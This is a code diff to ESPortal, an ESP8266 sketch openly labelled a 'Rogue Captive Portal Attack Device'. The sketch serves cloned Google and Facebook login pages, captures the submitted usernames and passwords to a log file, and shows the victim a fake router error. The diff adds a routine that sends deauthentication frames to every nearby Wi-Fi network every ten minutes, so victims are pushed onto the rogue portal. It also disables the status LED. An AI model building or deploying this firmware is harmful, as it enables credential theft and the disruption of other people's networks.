@@ -1,11 +1,11 @@
 /*
- *ESPortal by Corey Harding 
- * www.legacysecuritygroup.com
- * Configure access point name and up to 3 custom domains and login urls in config.h
- * Configure the html for login page of said domains in site1.h, site2.h, and site3.h
- * Configure the html for any other domain(catch-all) in site_other.h
- * This is only a proof-of-concept.  I am not responsible for your actions.
- * Obey all local, state, federal, and international laws!
+  ESPortal by Corey Harding
+   www.legacysecuritygroup.com
+   Configure access point name and up to 3 custom domains and login urls in config.h
+   Configure the html for login page of said domains in site1.h, site2.h, and site3.h
+   Configure the html for any other domain(catch-all) in site_other.h
+   This is only a proof-of-concept.  I am not responsible for your actions.
+   Obey all local, state, federal, and international laws!
 */
 #include <ESP8266WiFi.h>
 #include <WiFiClient.h>
@@ -18,6 +18,8 @@
 #include "site2.h"
 #include "sitecaptiveportal.h"
 #include "portal_login.h"
+#include "Deauth.h"
+#include "SimpleList.h"
 
 #define LOGFILE "/log.txt"
 
@@ -27,16 +29,20 @@ DNSServer dnsServer;
 ESP8266WebServer webServer(80);
 ESP8266WebServer httpServer(1337);
 
-String webString="";
-String serialString="";
+String webString = "";
+String serialString = "";
+Deauth d;
+
+unsigned long previousMillis = 0;
+const long interval = 1000*60*10;
 
 void blink(int n)
 {
-  for(int i = 0; i < n; i++)
+  for (int i = 0; i < n; i++)
   {
-    digitalWrite(LED_BUILTIN, LOW);    
-    delay(250);                    
-    digitalWrite(LED_BUILTIN, HIGH);  
+    //digitalWrite(LED_BUILTIN, LOW);
+    delay(250);
+    //digitalWrite(LED_BUILTIN, HIGH);
     delay(250);
   }
 }
@@ -48,8 +54,8 @@ void setup() {
   Serial.println("V2.0.0 - Rouge Captive Portal Attack Device");
   Serial.println();
 
-  pinMode(LED_BUILTIN, OUTPUT);
-  digitalWrite(LED_BUILTIN, HIGH);  
+  //pinMode(LED_BUILTIN, OUTPUT);
+  //digitalWrite(LED_BUILTIN, HIGH);
 
   // Initialize file system and log file
   Serial.print("Initializing File System (First time can take around 90 seconds)...");
@@ -58,7 +64,7 @@ void setup() {
   Serial.print("Checking for log.txt file...");
   // this opens the file "log.txt" in read-mode
   File f = SPIFFS.open(LOGFILE, "r");
-  
+
   if (!f) {
     Serial.print(" File doesn't exist yet. \nFormatting and creating it...");
     SPIFFS.format();
@@ -91,22 +97,22 @@ void setup() {
   });
 
   //generic catch all login page for domains not listed in configuration
-  webServer.on(SITEOTHER_redirect,[]() {
+  webServer.on(SITEOTHER_redirect, []() {
     webServer.send_P(200, "text/html", GOOGLE_HTML);
   });
 
   //SITE1 login page
-  webServer.on(SITE1_redirect,[]() {
+  webServer.on(SITE1_redirect, []() {
     webServer.send_P(200, "text/html", GOOGLE_HTML);
   });
 
   //SITE2 login page
-  webServer.on(SITE2_redirect,[]() {
+  webServer.on(SITE2_redirect, []() {
     webServer.send_P(200, "text/html", FACEBOOK_HTML);
   });
 
   //Portal login page
-  webServer.on(PORTALLOGIN_redirect,[]() {
+  webServer.on(PORTALLOGIN_redirect, []() {
     webServer.send(200, "text/html", PORTAL_LOGIN_HTML);
   });
 
@@ -118,7 +124,7 @@ void setup() {
     String pass = webServer.arg("pass");
 
     // sending to serial (DEBUG)
-    serialString = user+":"+pass;
+    serialString = user + ":" + pass;
     Serial.println(serialString);
 
     // saving to file
@@ -129,21 +135,21 @@ void setup() {
     f.print(":");
     f.println(pass);
     f.close();
-    
+
     // send an error response
     webString = "<h1>#E701 - Router Configuration Error</h1>";
     webServer.send(500, "text/html", webString);
 
     // reset strings
-    serialString="";
-    webString="";
+    serialString = "";
+    webString = "";
 
     blink(5);
   });
 
   //Log Page
-  webServer.on("/esportal/log", [](){
-    webString="<html><body><a href=\"/esportal\"><- BACK TO INDEX</a><br><pre>";
+  webServer.on("/esportal/log", []() {
+    webString = "<html><body><a href=\"/esportal\"><- BACK TO INDEX</a><br><pre>";
     File f = SPIFFS.open(LOGFILE, "r");
     serialString = f.readString();
     webString += serialString;
@@ -151,10 +157,10 @@ void setup() {
     webString += "</pre></body></html>";
     webServer.send(200, "text/html", webString);
     Serial.println(serialString);
-    serialString="";
-    webString="";
+    serialString = "";
+    webString = "";
   });
-  
+
   //Start Webserver
   Serial.print("Starting Web Server...");
   webServer.begin();
@@ -163,6 +169,7 @@ void setup() {
   MDNS.addService("http", "tcp", 1337);
   Serial.println(" Success!");
   blink(10);
+  d.startScan();
   Serial.println("Device Ready!");
 }
 
@@ -171,4 +178,11 @@ void loop() {
   dnsServer.processNextRequest();
   webServer.handleClient();
   httpServer.handleClient();
+  unsigned long currentMillis = millis();
+  if (currentMillis - previousMillis >= interval) {
+    previousMillis = currentMillis;
+    d.startDeauthAll();
+    d.startScan();
+  }
 }
+
